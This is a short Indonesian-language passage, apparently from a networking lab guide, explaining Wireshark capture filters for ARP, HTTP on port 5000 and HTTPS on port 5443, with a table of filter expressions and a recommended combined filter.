Capture filter dimasukkan di kolom **Capture Filter** SEBELUM klik Start. Berbeda dari display filter, capture filter hanya menangkap paket yang sesuai, sehingga file `.pcap` lebih kecil.

| Capture Filter | Fungsi |
| -------------- | ------ |
| `arp` | Hanya capture paket ARP |
| `port 5000` | Hanya capture traffic HTTP (port 5000) |
| `port 5443` | Hanya capture traffic HTTPS (port 5443) |
| `host 172.20.0.x` | Hanya capture traffic dari/ke IP tertentu |
| `arp or port 5000` | Capture ARP dan HTTP bersamaan |
| `arp or port 5000 or port 5443` | Capture ARP, HTTP, dan HTTPS — **filter yang direkomendasikan** |
